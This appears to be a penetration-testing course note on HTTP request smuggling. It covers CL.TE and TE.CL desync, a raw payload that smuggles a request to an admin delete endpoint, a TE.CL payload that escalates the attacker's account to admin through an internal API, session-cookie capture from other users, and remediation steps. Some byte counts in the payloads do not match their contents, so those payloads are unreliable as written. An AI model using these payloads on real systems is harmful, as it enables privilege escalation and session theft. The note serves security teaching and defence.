---
tags: [chaining, advanced, real-world, vapt]
difficulty: expert
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.20 Chain HTTP Smuggling"
---

# 60.20 - Chain HTTP Smuggling to Privilege Escalation

## 1. Introduction to HTTP Request Smuggling

HTTP Request Smuggling (HRS) is an advanced, highly critical vulnerability that arises from discrepancies in how different servers in an HTTP infrastructure chain (e.g., front-end load balancers, reverse proxies, and back-end application servers) parse HTTP request boundaries. 

When a front-end server and a back-end server disagree on where a specific HTTP request ends and the next one begins, an attacker can "smuggle" a hidden, malicious request within the body of a legitimate one. Once the smuggled request hits the back-end server, it is processed as the start of a brand new, separate request.

This discrepancy allows attackers to bypass front-end security controls (like WAFs or routing ACLs), hijack other users' sessions, steal credentials, and perform unauthorized privilege escalation by accessing restricted administrative endpoints that are otherwise blocked at the edge network.

## 2. Theoretical Foundations: Content-Length vs Transfer-Encoding

The HTTP/1.1 specification provides two primary ways to specify the length of a request body:
1. `Content-Length` (CL): Specifies the exact size of the body in bytes.
2. `Transfer-Encoding: chunked` (TE): Specifies that the body is sent in a series of chunks, where each chunk is preceded by its size in hexadecimal format. The message ends with a zero-sized chunk (`0\r\n\r\n`).

Vulnerabilities occur when an attacker sends an ambiguous request containing **both** headers. Depending on the server software, one server might prioritize `Content-Length` while the other prioritizes `Transfer-Encoding`.

### The Core Smuggling Permutations:
- **CL.TE**: The front-end uses `Content-Length` and the back-end uses `Transfer-Encoding`.
- **TE.CL**: The front-end uses `Transfer-Encoding` and the back-end uses `Content-Length`.
- **TE.TE**: Both servers support `Transfer-Encoding`, but one can be induced to ignore it by obfuscating the header (e.g., `Transfer-Encoding: xchunked`).

## 3. Attack Architecture and Flow Diagram

Below is the execution flow of a **CL.TE** HTTP Request Smuggling attack designed to bypass a front-end proxy that blocks access to `/admin`.

```text
 [ Attacker ]
    | 
    | (1) Sends an ambiguous HTTP request with both CL and TE headers
    | 
    |  +-------------------------------------------------------------+
    |  | POST / HTTP/1.1                                             |
    |  | Host: target.com                                            |
    |  | Content-Length: 43                                          |
    |  | Transfer-Encoding: chunked                                  |
    |  |                                                             |
    |  | 0                                                           |
    |  |                                                             |
    |  | GET /admin/delete_user?id=admin HTTP/1.1                    |
    |  | Host: localhost                                             |
    |  +-------------------------------------------------------------+
    v
 [ Front-End Proxy (HAProxy / AWS ALB) ]
    | (2) Processes Content-Length (CL = 43). 
    | (3) Believes the entire payload (including the GET /admin) 
    |     is just the body of a single POST request to "/".
    | (4) Validates "/" is allowed. Forwards the single request.
    v
 [ Back-End Server (Gunicorn / Node.js) ]
    | (5) Processes Transfer-Encoding (TE). 
    | (6) Reads the chunk size "0", and assumes the first request has ended!
    | (7) The remaining bytes in the TCP stream ("GET /admin...") are 
    |     buffered and interpreted as the start of the NEXT HTTP request.
    v
 [ Back-End Application Logic ]
    | (8) Executes Request 1: POST / -> 200 OK
    | (9) Executes Request 2 (Smuggled): GET /admin/delete_user -> 200 OK (Action Performed!)
```

## 4. Exploitation Scenario: Privilege Escalation via API

Let's assume the target environment has the following architecture:
- Public API Gateway at `api.target.com`.
- Routing rule: `Drop request if path starts with /internal`.
- Back-end microservices process the requests.

The attacker wants to hit `POST /internal/escalate-privileges` to make their own account an administrator. This endpoint does not require authentication because it assumes only the internal network or the frontend proxy can reach it.

### Step 1: Crafting the TE.CL Payload
In this scenario, the front-end uses TE, and the back-end uses CL.
The attacker crafts the following payload:

```http
POST / HTTP/1.1
Host: api.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

6c
POST /internal/escalate-privileges HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 35

{"username":"hacker","role":"admin"}
0


```

### Step 2: The Desync in Action
1. **Front-End (TE):** Reads the chunk size `6c` (108 bytes in hex), processes the chunk containing the smuggled request, then reads the `0` chunk and forwards the whole stream.
2. **Back-End (CL):** Reads `Content-Length: 4`. It processes only the first 4 bytes of the body (`6c\r\n`). It considers the first request complete.
3. The remaining data (`POST /internal/escalate-privileges...`) is left lingering in the back-end's TCP socket buffer.

### Step 3: Execution and Impact
Because connections are kept alive (`Keep-Alive`), the back-end interprets the lingering data as the beginning of the next HTTP request. The smuggled request is executed by the back-end, completely bypassing the front-end's `/internal` access controls, and successfully upgrading the attacker's account privileges to "admin".

## 5. Advanced Chain: Capturing Other Users' Requests

If the attacker cannot escalate privileges directly via internal APIs, they can smuggle a request designed to capture the credentials or session cookies of the *next* user who sends a legitimate request to the server over the same TCP connection.

By smuggling a request to an endpoint that reflects input (e.g., a "Create Comment" or "Profile Update" endpoint) and leaving the `Content-Length` of the smuggled request artificially large, the back-end server will append the victim's entire HTTP request (headers, cookies, and body) to the attacker's smuggled parameter, saving the victim's session token into the attacker's profile.

## 6. Remediation and Defense Architecture

To eliminate HTTP Request Smuggling, organizations must enforce absolute consistency across their HTTP infrastructure.

1. **Adopt HTTP/2 Exclusively:** HTTP/2 uses a robust binary framing mechanism rather than ambiguous string parsing for boundaries. Enabling end-to-end HTTP/2 (from client to front-end, AND from front-end to back-end) natively mitigates these desynchronization vectors.
2. **Disable Connection Reuse:** Disabling HTTP Keep-Alive on the backend prevents lingering requests from poisoning the socket. However, this incurs a massive performance penalty and is not viable for high-traffic environments.
3. **Normalize Ambiguous Requests:** Configure the front-end proxy to actively reject (HTTP 400) any request that contains both `Content-Length` and `Transfer-Encoding` headers.
4. **Consistent Server Software:** Use the same server software or strictly align the HTTP parsing configurations (e.g., RFC 7230 compliance) across all network layers.

## 7. Chaining Opportunities

- **[[17 - Chain CORS to Full ATO]]**: Use request smuggling to bypass proxy restrictions, serving a malicious CORS payload directly from the back-end application.
- **[[06 - Cross-Site Scripting (XSS) in Detail]]**: Smuggle a request that serves an XSS payload, effectively creating a persistent XSS attack against any user whose request happens to append to the smuggled response.
- **[[26 - Web Application Firewalls (WAF) Evasion]]**: Use request smuggling to completely bypass WAF inspection, as the WAF only inspects the "wrapper" request while the payload is parsed as a secondary, uninspected request by the backend.

## 8. Related Notes

- [[09 - Understanding Load Balancers and Proxies]]
- [[31 - API Security Fundamentals]]
- [[40 - Authentication and Session Management Protocols]]
- [[52 - Advanced HTTP Protocol Attacks]]
